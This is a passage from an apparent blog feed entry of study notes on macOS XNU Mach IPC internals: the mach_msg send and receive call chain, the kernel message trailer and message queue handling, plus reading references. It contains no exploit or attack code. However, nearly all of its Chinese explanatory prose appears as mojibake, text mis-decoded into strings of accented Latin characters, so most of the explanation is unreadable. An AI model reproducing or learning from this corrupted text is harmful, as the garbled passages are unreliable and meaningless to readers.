class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mach_msg(...)</span><br><span class="line">    mach_msg_trap(...)</span><br><span class="line">        mach_msg_overwrite_trap(...)</span><br><span class="line">            option &amp; MACH_SEND_MSG --&gt; mach_msg_send</span><br><span class="line">                <span class="comment">// mach_msg --&gt; kmsg</span></span><br><span class="line">                <span class="comment">// alloc a kernel msg buffer(kmsg), and copy user mach_msg to kernel msg buffer</span></span><br><span class="line">                ipc_kmsg_get(msg_addr, send_size, &amp;kmsg);</span><br><span class="line">                ipc_kmsg_copyin</span><br><span class="line">                    ipc_kmsg_copyin_hearder(kmsg, space, <span class="keyword">override</span>, optionp)</span><br><span class="line">                    ipc_kmsg_copyin_body(kmsg, space, <span class="built_in">map</span>, optionp)</span><br><span class="line">                ipc_kmsg_send</span><br><span class="line">                    ipc_voucher_send_preprocessing(kmsg);</span><br><span class="line">                    ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg,option,send_timeout);</span><br><span class="line">            option &amp; MACH_RCV_MSG <span class="comment">//TODO</span></span><br><span class="line">                ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</span><br><span class="line">                mach_msg_rcv_link_special_reply_port(...)</span><br><span class="line">                ipc_mqueue_receive</span><br><span class="line">                mach_msg_receive_results</span><br></pre></td></tr></table></figure><h4 id="2-3-2-å‘é€"><a href="#2-3-2-å‘é€" class="headerlink" title="2.3.2 å‘é€"></a>2.3.2 å‘é€</h4><ul><li><p>mach_msg_send( mach_msg_header_t    *msg, mach_msg_option_t    option, mach_msg_size_t        send_size, mach_msg_timeout_t    send_timeout, mach_msg_priority_t    override)</p><p>  æ ¹æ®æ¶ˆæ¯å¤§å°é‡æ–°åˆ†é…äº†å†…å­˜ï¼Œå¹¶ä¸”æŠŠæ¶ˆæ¯æ‹·è´è¿›æ¥ï¼Œå¹¶ä¸”æ¶ˆæ¯å°¾éƒ¨å¢åŠ äº†ä¸€äº›å­—æ®µ:</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trailer = (<span class="keyword">mach_msg_max_trailer_t</span> *) ((<span class="keyword">vm_offset_t</span>)kmsg-&gt;ikm_header + send_size);</span><br><span class="line">trailer-&gt;msgh_sender = current_thread()-&gt;task-&gt;sec_token;</span><br><span class="line">trailer-&gt;msgh_audit = current_thread()-&gt;task-&gt;audit_token;</span><br><span class="line">trailer-&gt;msgh_trailer_type = MACH_MSG_TRAILER_FORMAT_0;</span><br><span class="line">trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span><br></pre></td></tr></table></figure><p>   ä¹‹å‰å®¡æœåŠ¡çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œè¿˜ä»¥ä¸ºè¿™éƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œé€ æˆä¹Œé¾™ã€‚ å›§</p><ul><li><p>ipc_kmsg_copyin(kmsg, space, map, override, &amp;option);</p><p>  æ­¤æ—¶<code>kmsg</code>æ˜¯æ–°åˆ†é…çš„å†…å­˜ï¼Œé‡Œé¢æ”¾çš„æ˜¯è¦å‘é€çš„mach msgï¼Œ spaceå’Œmapéƒ½æ˜¯å½“å‰taskçš„spaceå’Œmapï¼Œç›´æ¥è·å–ï¼Œè¿™éƒ¨åˆ†æœ‰ä¸ªå›¾ï¼Œå¯ä»¥çœ‹<code>Macos Internals</code>ã€‚</p><ul><li>ipc_kmsg_copyin_header(kmsg, space, override, optionp);<br>   æ‹·è´ <code>port rights</code>ï¼ŒæˆåŠŸçš„è¯ï¼ŒåŸæœ¬æ¶ˆæ¯ä¸­(kmsg)çš„port nameéƒ½ä¼šè¢«æ›¿æ¢æˆå¯¹åº”çš„å¯¹è±¡çš„æŒ‡é’ˆã€‚</li><li>ipc_kmsg_copyin_body( kmsg, space, map);<br>  <strong>æ‹·è´msg bodyéƒ¨åˆ†ï¼Œä¸­é—´éªŒè¯äº†sizeã€descéƒ¨åˆ†çš„sizeï¼Œç±»å‹ç­‰å­—æ®µã€‚</strong><br>  desc_count &lt; 0x3fff ã€‚<br>  descriptor_sizeéƒ¨åˆ†ï¼Œå¿…é¡»æ˜¯desc*16 == descriptor_sizeï¼Œä¸æ»¡è¶³ä¼šä¸ºäº†å¯¹é½è€Œè°ƒæ•´ã€‚<br>   æœ€ç»ˆå®Œæˆæ‹·è´ï¼ŒæŠŠç”¨æˆ·æ€çš„<code>mach msg</code>æ‹·è´åˆ°äº†kmsgä¸­ã€‚</li></ul></li><li><p>ipc_kmsg_send(kmsg, option, send_timeout);<br>  åˆ°è¿™é‡Œçš„æ—¶å€™port rightæ‹·è´äº†ï¼Œæ¶ˆæ¯å†…å®¹ä¹Ÿæ‹·è´äº†ï¼Œè¯¥ç›´æ¥å‘é€äº†ã€‚<strong>æŠŠæ¶ˆæ¯å‘é€åˆ°dstçš„æ¶ˆæ¯é˜Ÿåˆ—é‡Œã€‚</strong><br>  å¯¹äºå‘é€ç»™å†…æ ¸çš„æ¶ˆæ¯å’Œéå†…æ ¸çš„æ¶ˆæ¯åˆ†å¼€å¤„ç†<br>  å†…æ ¸ï¼š<code>kmsg = ipc_kobject_server(kmsg, option);</code><br>  å…¶ä»–ï¼š<code>ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</code></p></li></ul><h4 id="2-3-3-æ¥æ”¶"><a href="#2-3-3-æ¥æ”¶" class="headerlink" title="2.3.3 æ¥æ”¶"></a>2.3.3 æ¥æ”¶</h4><ul><li><p><code>ipc_mqueue_copyin(space, rcv_name, &amp;mqueue, &amp;object);</code><br>  Convert a name in a space to a message queue.<br>  æ ¹æ®è¿™ä¸ªrecv_nameåœ¨spaceé‡Œæ‰¾åˆ°<code>ipc_entry</code>ç»“æ„ï¼Œä»è€Œæ‰¾åˆ°å…¶ä¸­<code>ipc_object-&gt;ipmessage</code>ç»“æ„ã€‚<br>  <img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688799669922.jpg" alt="-w532"></p></li><li><p>mach_msg_rcv_link_special_reply_port(â€¦)</p></li><li><p><code>ipc_mqueue_receive(mqueue, option, rcv_size, msg_timeout, THREAD_ABORTSAFE);</code><br>  Receive a message from a message queue<br>  ä¹‹å‰å¾—åˆ°äº†æ¶ˆæ¯é˜Ÿåˆ—<code>mqueue</code>ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä»è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯ã€‚</p><ul><li><p>ipc_mqueue_receive_on_thread<br>ä½¿ç”¨æŒ‡å®šthreadä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶æ¶ˆæ¯ã€‚<br>æ¥å—åˆ†port set(<code>imq_is_set()</code>) å’Œ å•ä¸ªport(<code>imq_is_queue()</code>)ï¼Œè¿™éƒ¨åˆ†çœ‹message queueçš„ç»“æ„ä½“ä¹Ÿèƒ½çœ‹å‡ºæ¥å¿…é¡»è¦è¿™ä¹ˆå¤„ç†ã€‚</p><p>æ¶ˆæ¯é˜Ÿåˆ—æ˜¯ä¸€ä¸ªå¾ªç¯åŒå‘é“¾è¡¨ï¼Œå–æ¶ˆæ¯çš„è¿‡ç¨‹å°±æ˜¯ä¸€ä¸ª unlinkçš„è¿‡ç¨‹ï¼š<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/mac_ipc_basic/15688831598476.jpg" alt="-w629"></p></li></ul></li></ul><ul><li>mach_msg_receive_results<br>  Receive a messageï¼Œ copy outçš„æ“ä½œï¼ŒæŠŠä¹‹å‰â€œè§£é“¾â€çš„æ¶ˆæ¯æ‹·è´å‡ºæ¥ã€‚</li></ul><h2 id="3-å¼•ç”¨"><a href="#3-å¼•ç”¨" class="headerlink" title="3. å¼•ç”¨"></a>3. å¼•ç”¨</h2><p><a href="https://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/">å†è°ˆMach-IPC</a><br>Mac OS X Internals<br>MOXil<br>Auditing and Exploiting Apple IPC â€“ Ianbeer<br><a href="https://bazad.github.io/">bazad</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-æ–¹å¼&quot;&gt;&lt;a href=&quot;#1-æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;1. æ–¹å¼&quot;&gt;&lt;/a&gt;1. æ–¹å¼&lt;/h2&gt;</summary>
    
    
    
    <category term="å­¦ä¹ è®°å½•" scheme="http://o0xmuhe.me/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="MacOS" scheme="http://o0xmuhe.me/tags/MacOS/"/>
    
    <category term="IPC" scheme="http://o0xmuhe.me/tags/IPC/"/>
    
    <category term="Mach" scheme="http://o0xmuhe.me/tags/Mach/"/>
    
  </entry>
  
</feed>
